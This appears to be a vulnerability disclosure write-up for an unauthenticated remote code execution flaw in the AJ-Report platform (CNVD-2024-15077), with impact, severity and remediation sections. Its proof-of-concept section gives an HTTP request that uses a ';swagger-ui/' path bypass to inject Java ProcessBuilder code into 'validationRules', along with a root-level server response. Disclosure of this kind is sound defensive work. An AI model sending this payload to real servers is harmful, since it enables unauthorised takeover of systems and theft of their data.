# 🛡️ Unauthenticated RCE in AJ-Report (CNVD-2024-15077)

> [!IMPORTANT]
> **Vulnerability Discovery:** Identified a **Critical Remote Code Execution (RCE)** in the AJ-Report data visualization platform. 
> 
> By exploiting the `validationRules` parameter and bypassing filters via the `;swagger-ui/` endpoint, I achieved **full system command execution** with **root** privileges. [1.1, 1.2]

---

## 🔍 Vulnerability Type
*   **Vulnerability Name:** Remote Code Execution (RCE) via Expression Injection [1.2]
*   **CVE/CNVD ID:** CNVD-2024-15077 (High/Critical) [1.1]
*   **Attack Vector:** Unauthenticated JSON Injection [1.2]

## 💥 Impact
This vulnerability allows for a **Total System Takeover**:

*   **Root Level Access:** Execution of arbitrary commands as `uid=0(root)`. [1.1, 1.3]
*   **Data Exfiltration:** Full access to all business reports, datasets, and internal databases. [3.1]
*   **Identity Theft:** Massive leakage of active JWT tokens (`accessToken`, `refreshToken`) and session identifiers. [1.1, 2.1]
*   **Persistence:** Ability to install backdoors or pivot further into the internal network. [3.1]

## 🛠️ Proof of Concept (PoC)

I used a Java-based payload within the `validationRules` parameter to execute system commands: [1.2]

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: <TARGET_IP>:<PORT>
Content-Type: application/json

{
  "validationRules": "function verification(data){a=new java.lang.ProcessBuilder(\"whoami\").start().getInputStream(); ... return ss;}"
}
```
## 📸 Evidence
<img width="1875" height="853" alt="image" src="https://github.com/user-attachments/assets/cd9caef3-016a-4b82-8a09-a35765d4ccdf" />


Click on the image to view it in high resolution

Server Response (Exploited): [1.1]
"xmsg": "Successfully\nuid=0(root) gid=0(root) groups=0(root)\nroot..."

## 📊 Severity


| Metric | Value |
| :--- | :--- |
| **Severity** | **CRITICAL** |
| **Privileges Required** | **None** |
| **OS Compromise** | **Full (Root)** |

## 🛡️ Remediation

1.  **Update Software:** Apply the latest security patches for AJ-Report immediately. [3.1]
2.  **Input Filtering:** Sanitize and restrict the usage of dynamic scripting in `validationRules`. [3.1]
3.  **Firewall:** Restrict access to management and reporting interfaces using a VPN or IP whitelist. [3.1]

---
*Responsible disclosure. Educational purposes only.* [3.1]

